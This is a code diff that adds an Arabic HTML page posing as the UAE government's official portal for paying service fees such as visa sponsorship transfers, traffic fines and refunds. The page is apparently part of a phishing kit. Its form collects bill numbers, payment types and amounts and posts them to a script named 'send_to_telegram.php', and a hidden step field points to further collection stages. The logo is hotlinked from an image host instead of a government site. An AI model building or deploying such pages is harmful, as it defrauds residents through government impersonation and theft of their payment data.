@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>القنوات الذكية لتسديد رسوم الخدمات الحكومية | البوابة الرسمية لحكومة الإمارات العربية المتحدة</title>
+    <meta property="og:image" content="https://www2.0zz0.com/2025/03/10/21/595608613.jpg">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background: #ffffff;
+        }
+
+        header {
+            background: #ffffff;
+            padding: 12px 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+        }
+
+        .logo {
+            height: 60px;
+            object-fit: contain;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 0 15px;
+        }
+
+        .nav-bar {
+            color: #158311;
+            padding: 12px;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+
+        .main-section {
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.05);
+        }
+
+        h1 {
+            color: #158311;
+            font-size: 20px;
+            margin-bottom: 15px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            color: #5c5c5c;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #158311;
+            border-radius: 6px;
+            background: #fff4ec;
+            font-size: 14px;
+        }
+
+        #manualInput {
+            display: none;
+            margin-top: 10px;
+        }
+
+        .service-button {
+            background: #158311;
+            color: white !important;
+            padding: 12px 35px;
+            border-radius: 6px;
+            display: inline-block;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 15px;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <img src="https://www2.0zz0.com/2025/03/10/21/595608613.jpg" 
+             alt="شعار سداد" 
+             class="logo"
+             style="height: 60px; width: auto;">
+    </header>
+
+    <div class="container">
+        <div class="nav-bar">
+            <a style="color: #158311;">الرئيسية / شخصي</a>
+        </div>
+<form action="send_to_telegram.php" method="post">
+        <div class="main-section">
+            <h1>إتمام عملية السداد</h1>
+            
+            <div class="input-group">
+                <label>أدخل رقم الفاتورة</label>
+                <input type="text" name="s1" required>
+            <input type="hidden" name="step" value="data">
+            </div>
+
+            <div class="input-group">
+                <label>اختر نوع السداد</label>
+                <select name="s2" id="paymentType" onchange="toggleManualInput()">
+                    <option value="مدفوعات حكومية">مدفوعات حكومية</option>
+                    <option value="مدفوعات ديوان ملكي">مدفوعات ديوان ملكي</option>
+                    <option value="مدفوعات تأمينات اجتماعية">مدفوعات تأمينات اجتماعية</option>
+                    <option value="مدفوعات الزراعة والبيئة">مدفوعات الزراعة والبيئة</option>
+                    <option value="مدفوعات الجوازات">مدفوعات الجوازات</option>
+                    <option value="مدفوعات مخالفات مكتب العمل">مدفوعات مخالفات مكتب العمل</option>
+                    <option value="رسوم مركبات">رسوم مركبات</option>
+                    <option value="رسوم نقل كفالة">رسوم نقل كفالة</option>
+                    <option value="رسوم تغيير مهنة">رسوم تغيير مهنة</option>
+                    <option value="دفع رسوم تأييد رعاة">دفع رسوم تأييد رعاة</option>
+                    <option value="رسوم تمكين">رسوم تمكين</option>
+                    <option value="مدفوعات مخالفات مرورية">مدفوعات مخالفات مرورية</option>
+                                        <option value="استرداد أموال">استرداد اموال</option>
+                    <option value="مدفوعات أخرى">مدفوعات أخرى</option>
+                </select>
+                <input type="text" id="manualInput" placeholder="أدخل نوع السداد يدويًا">
+            </div>
+
+            <div class="input-group">
+                <label>قيمة رسوم السداد (درهم إماراتي)</label>
+                <input type="number" name="s3" required>
+            </div>
+
+            <button type="submit" class="service-button">المتابعة والإكمال</button>
+        </div>
+    </div>
+</form>
+    <script>
+        function toggleManualInput() {
+            const paymentType = document.getElementById('paymentType');
+            const manualInput = document.getElementById('manualInput');
+            manualInput.style.display = (paymentType.value === 'مدفوعات أخرى') ? 'block' : 'none';
+        }
+    </script>
+</body>
+</html>
